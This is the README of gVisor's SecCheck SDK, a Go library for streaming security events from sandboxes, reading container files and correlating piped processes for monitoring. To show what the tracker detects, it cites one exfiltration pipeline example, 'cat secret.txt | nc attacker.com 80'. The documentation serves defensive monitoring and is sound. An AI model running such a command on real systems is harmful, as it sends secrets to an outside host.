# gVisor - SecCheck SDK (`scsdk`)

The `scsdk` package provides an SDK library for seccheck consumers to interact
with running sandboxes via RPC. Use this API to connect to the control socket of
a running gVisor sandbox and stream security events and issue queries, such as
reading files from the container's virtual environment.

## Overview

-   `SandboxClient` struct manages the RPC connection (`urpc.Client`) to the
    socket.
-   Helper methods provide simplified operations, for example, reading a file.
-   All file operations allow targeting either the root namespace or an
    individual `ContainerID`.

## Establishing a Connection

Use `scsdk.Connect` to establish a connection using a known socket path (e.g.
`/var/run/runsc/<id>/control`):

```go
import "gvisor.dev/gvisor/pkg/sentry/seccheck/scsdk"

c, err := scsdk.Connect("/var/run/runsc/<sandbox-id>/control")
if err != nil {
    log.Fatalf("failed to connect: %v", err)
}
defer c.Close()
```

If you already have a `*urpc.Client`, you can wrap it into a `*SandboxClient` by
using `scsdk.NewSandboxClient(conn)`.

## Use Case 1: Reading Files (Fs.Read equivalent)

This command emulates `runsc read` but is much faster since it avoids the
overhead of spawning a new process. It is capable of fetching the contents of a
file inside the gVisor sandbox environment, which may diverge from the host
filesystem.

To read a file entirely into memory and get a byte slice:

```go
data, err := c.ReadFile(scsdk.ReadOptions{
    ContainerID: "container-id",
    Path:        "/etc/passwd",
    Offset:      0,
    Size:        4096,
})
if err != nil {
    log.Fatalf("failed to read file: %v", err)
}
fmt.Printf("File content: %s\n", data)
```

The fields of `ReadOptions` specify the following behavior:

-   `ContainerID`: Specifies the container from which the filesystem is read.
    You can leave it empty to read from the root container.
-   `Path`: The filesystem path of the file to read.
-   `Offset`: The byte offset to start reading from. This **must be `0`** for
    non-seekable files (such as pipes and sockets).
-   `Size`: The maximum number of bytes to read. A value of `0` means unlimited.

To stream a file to an `io.Writer` (useful for large files without buffering
them into memory):

```go
err := c.ReadFileToWriter(scsdk.ReadOptions{
    Path: "/var/log/app.log", // reads from root container
}, os.Stdout)
if err != nil {
    log.Fatalf("failed to stream file: %v", err)
}
```

Note: if the provided `io.Writer` is an `*os.File`, `ReadFileToWriter` avoids an
extra layer of buffering/copying by passing its file descriptor directly to the
urpc server.

For quick, one-shot reads that don't need a persistent `SandboxClient` object,
package-level functions are also available. These will automatically dial and
close the control socket:

```go
data, err := scsdk.ReadFile("/var/run/runsc/<sandbox-id>/control", scsdk.ReadOptions{
    Path: "/proc/version",
})

err = scsdk.ReadFileToWriter("/var/run/runsc/<sandbox-id>/control", scsdk.ReadOptions{
    Path: "/proc/version",
}, os.Stdout)
```

## Use Case 2: Tracking Shell Pipelines

The `scsdk.ProcessTracker` can be used by a trace consumer to track historical
process metadata (PID, start time, binary path, argv, and env) and automatically
enrich events with sibling process information when processes are connected via
stdin or stdout pipes.

For example, when users execute shell pipelines inside the container (e.g., `cat
secret.txt | nc attacker.com 80`), the kernel registers these as two entirely
independent process executions. By maintaining historical process state, the
`ProcessTracker` analyzes the file descriptors and automatically correlates that
the `nc` process is receiving its `stdin` pipe directly from `cat`'s `stdout`.
This allows security monitoring daemons to reconstruct the pipeline and identify
events that would otherwise appear disjointed or unrelated.

Note: The `ProcessTracker` is entirely decoupled from the RPC connection and
does not communicate directly with the sandbox. It is an offline state machine.
Users must independently receive the raw protobuf messages (e.g., from a sink
like the remote HTTP endpoints or Unix sockets) and explicitly feed them into
`ProcessExecve` and `ProcessTaskExit` to maintain the tracking state.

**Important:** A cached process will only be removed from the internal tracker
upon receiving a `TaskExit` event. If your sink config filters out task exit
events, or if you fail to feed them to the tracker, the internal cache will grow
indefinitely and cause a memory leak.

### Usage

```go
import "gvisor.dev/gvisor/pkg/seccheck/scsdk"

// Initialize a ProcessTracker in your monitoring daemon:
pt := scsdk.NewProcessTracker()

// Whenever a protobuf message arrives from the source (e.g. Unix socket, gRPC, file):
switch msg := protoMsg.(type) {
case *pb.ExecveInfo:
    // Map the raw protobuf to a SDK event:
    execEvent := scsdk.ToExecutionEvent(msg)

    // ProcessExecve updates the tracker table and returns an EnrichedExecveEvent
    // where PipeInputSibling and PipeOutputSibling are automatically resolved.
    enriched := pt.ProcessExecve(execEvent)
    fmt.Printf("Process executed: %s (PID %d, Argv: %v)\n",
        enriched.Process.BinaryPath, enriched.Process.Key.ThreadGroupID, enriched.Process.Argv)

    if sib := enriched.PipeInputSibling; sib != nil {
        fmt.Printf("  <- Piped input from sibling: %s (PID %d, Argv: %v)\n",
            sib.BinaryPath, sib.Key.ThreadGroupID, sib.Argv)
    }
    if sib := enriched.PipeOutputSibling; sib != nil {
        fmt.Printf("  -> Piped output to sibling: %s (PID %d, Argv: %v)\n",
            sib.BinaryPath, sib.Key.ThreadGroupID, sib.Argv)
    }

case *pb.TaskExit:
    // ProcessTaskExit cleans up tracked state when a thread group exits.
    pt.ProcessTaskExit(scsdk.ToTaskExitEvent(msg))
}
```
